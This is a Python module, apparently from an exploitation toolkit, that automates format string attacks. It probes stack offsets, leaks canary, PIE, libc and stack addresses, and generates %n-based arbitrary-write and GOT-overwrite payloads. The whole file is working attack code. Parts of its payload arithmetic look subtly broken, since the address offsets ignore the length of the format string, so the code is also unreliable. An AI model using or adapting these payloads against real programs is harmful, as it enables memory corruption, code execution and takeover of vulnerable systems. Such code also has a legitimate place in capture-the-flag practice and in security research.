"""
Format String Exploitation Module.

Provides automated format string vulnerability exploitation including:
- Offset discovery
- Address leaking (stack, libc, canary, PIE)
- Arbitrary write primitives
- GOT overwrite automation
"""

from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple, Any
import struct

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class FormatStringInfo:
    """Information gathered from format string exploitation."""
    offset: int = 0  # Format string offset on stack
    leaked_addresses: List[Tuple[int, int]] = field(default_factory=list)  # (offset, value)
    canary: Optional[int] = None
    pie_base: Optional[int] = None
    libc_base: Optional[int] = None
    stack_addr: Optional[int] = None

    # Write tracking
    writes_performed: List[Tuple[int, int]] = field(default_factory=list)  # (addr, value)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "offset": self.offset,
            "canary": hex(self.canary) if self.canary else None,
            "pie_base": hex(self.pie_base) if self.pie_base else None,
            "libc_base": hex(self.libc_base) if self.libc_base else None,
            "stack_addr": hex(self.stack_addr) if self.stack_addr else None,
        }


class FormatStringExploiter:
    """
    Automated format string exploitation.

    Usage:
        exploiter = FormatStringExploiter(bits=64)

        # Find offset
        offset = exploiter.find_offset(send_func, recv_func)

        # Leak addresses
        leaks = exploiter.leak_stack(send_func, recv_func, num_leaks=20)

        # Arbitrary write
        payload = exploiter.write_value(target_addr, value)
    """

    def __init__(
        self,
        bits: int = 64,
        offset: int = 0,
        write_size: str = "byte",  # byte, short, int
    ):
        """
        Initialize format string exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            offset: Known format string offset (0 to auto-discover)
            write_size: Size of individual writes for %n
        """
        self.bits = bits
        self.word_size = bits // 8
        self.offset = offset
        self.write_size = write_size
        self.info = FormatStringInfo(offset=offset)

    def find_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int = 50,
        marker: bytes = b"AAAAAAAA",
    ) -> int:
        """
        Find format string offset automatically.

        Args:
            send_func: Function to send payload to target
            recv_func: Function to receive response
            max_offset: Maximum offset to try
            marker: Unique marker to search for

        Returns:
            Discovered offset
        """
        # Use marker that's easy to spot in hex
        if self.bits == 64:
            marker = b"AAAAAAAA"
            marker_hex = "4141414141414141"
        else:
            marker = b"AAAA"
            marker_hex = "41414141"

        for i in range(1, max_offset + 1):
            # Build test payload
            payload = marker + f"%{i}$p".encode()

            try:
                send_func(payload)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore')

                # Check if we leaked our marker
                if marker_hex.lower() in response_str.lower():
                    self.offset = i
                    self.info.offset = i
                    logger.info(f"Found format string offset: {i}")
                    return i

            except Exception as e:
                logger.debug(f"Offset {i} failed: {e}")
                continue

        logger.warning(f"Could not find offset in range 1-{max_offset}")
        return 0

    def leak_value(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        stack_offset: int,
    ) -> Optional[int]:
        """
        Leak a single value from the stack.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive response
            stack_offset: Stack position to leak (relative to format string)

        Returns:
            Leaked value or None
        """
        payload = f"%{stack_offset}$p".encode()

        try:
            send_func(payload)
            response = recv_func()
            response_str = response.decode('latin-1', errors='ignore')

            # Parse hex value from response
            import re
            match = re.search(r'0x([0-9a-fA-F]+)', response_str)
            if match:
                value = int(match.group(1), 16)
                self.info.leaked_addresses.append((stack_offset, value))
                return value

        except Exception as e:
            logger.debug(f"Failed to leak offset {stack_offset}: {e}")

        return None

    def leak_stack(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        start_offset: int = 1,
        num_leaks: int = 20,
    ) -> Dict[int, int]:
        """
        Leak multiple stack values.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive response
            start_offset: Starting stack offset
            num_leaks: Number of values to leak

        Returns:
            Dict mapping offset to leaked value
        """
        leaks = {}

        for i in range(start_offset, start_offset + num_leaks):
            value = self.leak_value(send_func, recv_func, i)
            if value is not None:
                leaks[i] = value
                logger.debug(f"Leak [{i}]: 0x{value:x}")

        return leaks

    def identify_leaks(
        self,
        leaks: Dict[int, int],
        binary_base: int = 0x400000,
        libc_base_hint: int = 0x7f0000000000,
        stack_hint: int = 0x7ff000000000,
    ) -> FormatStringInfo:
        """
        Identify what the leaked values might be.

        Args:
            leaks: Dict of offset -> value
            binary_base: Expected binary base (for PIE detection)
            libc_base_hint: Expected libc range start
            stack_hint: Expected stack range start

        Returns:
            Updated FormatStringInfo
        """
        for offset, value in leaks.items():
            # Canary detection (usually ends in 00)
            if value & 0xFF == 0 and value > 0x100:
                if self.info.canary is None:
                    self.info.canary = value
                    logger.info(f"Potential canary at offset {offset}: 0x{value:x}")

            # Stack address detection
            if self.bits == 64 and (value >> 40) == 0x7ff:
                if self.info.stack_addr is None:
                    self.info.stack_addr = value
                    logger.info(f"Potential stack addr at offset {offset}: 0x{value:x}")

            # Libc address detection
            if self.bits == 64 and (value >> 40) == 0x7f:
                if value != self.info.stack_addr:
                    if self.info.libc_base is None:
                        # Rough base calculation (page-align)
                        self.info.libc_base = value & ~0xfff
                        logger.info(f"Potential libc addr at offset {offset}: 0x{value:x}")

            # PIE base detection
            if 0x500000 <= value <= 0x600000 or (value >> 44) == 0x5:
                if self.info.pie_base is None:
                    self.info.pie_base = value & ~0xfff
                    logger.info(f"Potential PIE base at offset {offset}: 0x{value:x}")

        return self.info

    def write_byte(self, addr: int, value: int) -> bytes:
        """
        Generate payload to write a single byte.

        Args:
            addr: Target address
            value: Byte value to write

        Returns:
            Format string payload
        """
        if self.bits == 64:
            addr_bytes = struct.pack("<Q", addr)
        else:
            addr_bytes = struct.pack("<I", addr)

        # Calculate padding needed
        if value == 0:
            value = 256  # %256c then %hhn writes 0

        # Payload: %Xc%offset$hhn + address
        # Note: address at offset needs to be calculated
        offset = self.offset
        payload = f"%{value}c%{offset}$hhn".encode()

        # Pad to alignment
        while len(payload) % self.word_size != 0:
            payload += b"X"

        payload += addr_bytes

        return payload

    def write_value(
        self,
        addr: int,
        value: int,
        write_size: str = None,
    ) -> bytes:
        """
        Generate payload to write an arbitrary value.

        Uses %hhn (byte) or %hn (short) writes for reliability.

        Args:
            addr: Target address
            value: Value to write
            write_size: Override default write size

        Returns:
            Format string payload
        """
        write_size = write_size or self.write_size

        if write_size == "byte":
            return self._write_bytes(addr, value)
        elif write_size == "short":
            return self._write_shorts(addr, value)
        else:
            return self._write_ints(addr, value)

    def _write_bytes(self, addr: int, value: int) -> bytes:
        """Write value byte-by-byte using %hhn."""
        num_bytes = self.word_size
        value_bytes = value.to_bytes(num_bytes, 'little')

        # Build addresses
        addresses = b""
        for i in range(num_bytes):
            if self.bits == 64:
                addresses += struct.pack("<Q", addr + i)
            else:
                addresses += struct.pack("<I", addr + i)

        # Calculate format string
        writes = []
        current = 0
        base_offset = self.offset

        for i, byte_val in enumerate(value_bytes):
            target = byte_val
            if target == 0:
                target = 256

            diff = (target - current) % 256
            if diff == 0:
                diff = 256

            writes.append(f"%{diff}c%{base_offset + i}$hhn")
            current = target

        fmt_str = "".join(writes).encode()

        # Pad to alignment
        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def _write_shorts(self, addr: int, value: int) -> bytes:
        """Write value using %hn (2 bytes at a time)."""
        num_shorts = self.word_size // 2

        addresses = b""
        for i in range(num_shorts):
            if self.bits == 64:
                addresses += struct.pack("<Q", addr + i * 2)
            else:
                addresses += struct.pack("<I", addr + i * 2)

        writes = []
        current = 0
        base_offset = self.offset

        for i in range(num_shorts):
            short_val = (value >> (i * 16)) & 0xFFFF
            if short_val == 0:
                short_val = 0x10000

            diff = (short_val - current) % 0x10000
            if diff == 0:
                diff = 0x10000

            writes.append(f"%{diff}c%{base_offset + i}$hn")
            current = short_val

        fmt_str = "".join(writes).encode()

        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def _write_ints(self, addr: int, value: int) -> bytes:
        """Write value using %n (4 bytes at a time)."""
        if self.bits == 64:
            addresses = struct.pack("<QQ", addr, addr + 4)
            writes = []

            low = value & 0xFFFFFFFF
            high = (value >> 32) & 0xFFFFFFFF

            if low > 0:
                writes.append(f"%{low}c%{self.offset}$n")
            if high > 0:
                diff = (high - low) % (1 << 32)
                writes.append(f"%{diff}c%{self.offset + 1}$n")
        else:
            addresses = struct.pack("<I", addr)
            writes = [f"%{value}c%{self.offset}$n"]

        fmt_str = "".join(writes).encode()

        while len(fmt_str) % self.word_size != 0:
            fmt_str += b"X"

        return fmt_str + addresses

    def got_overwrite(
        self,
        got_addr: int,
        target_addr: int,
    ) -> bytes:
        """
        Generate payload to overwrite a GOT entry.

        Args:
            got_addr: Address of GOT entry to overwrite
            target_addr: Address to write (e.g., system or one_gadget)

        Returns:
            Format string payload
        """
        logger.info(f"Generating GOT overwrite: 0x{got_addr:x} -> 0x{target_addr:x}")
        return self.write_value(got_addr, target_addr)

    @staticmethod
    def pwntools_payload(
        offset: int,
        writes: Dict[int, int],
        bits: int = 64,
    ) -> bytes:
        """
        Generate format string payload using pwntools fmtstr_payload.

        Args:
            offset: Format string offset
            writes: Dict of address -> value to write
            bits: Architecture bits

        Returns:
            Format string payload
        """
        try:
            from pwn import fmtstr_payload, context

            if bits == 64:
                context.arch = 'amd64'
            else:
                context.arch = 'i386'

            return fmtstr_payload(offset, writes)
        except ImportError:
            logger.warning("pwntools not available, using manual payload generation")
            # Fallback to manual
            exploiter = FormatStringExploiter(bits=bits, offset=offset)
            payloads = []
            for addr, val in writes.items():
                payloads.append(exploiter.write_value(addr, val))
            return b"".join(payloads)


# Convenience functions
def find_fmt_offset(
    send_func: Callable[[bytes], None],
    recv_func: Callable[[], bytes],
    bits: int = 64,
    max_offset: int = 50,
) -> int:
    """Find format string offset."""
    exploiter = FormatStringExploiter(bits=bits)
    return exploiter.find_offset(send_func, recv_func, max_offset)


def fmt_leak(
    send_func: Callable[[bytes], None],
    recv_func: Callable[[], bytes],
    offset: int,
    bits: int = 64,
    num_leaks: int = 20,
) -> Dict[int, int]:
    """Leak stack values via format string."""
    exploiter = FormatStringExploiter(bits=bits, offset=offset)
    return exploiter.leak_stack(send_func, recv_func, num_leaks=num_leaks)


def fmt_write(
    addr: int,
    value: int,
    offset: int,
    bits: int = 64,
) -> bytes:
    """Generate format string write payload."""
    exploiter = FormatStringExploiter(bits=bits, offset=offset)
    return exploiter.write_value(addr, value)
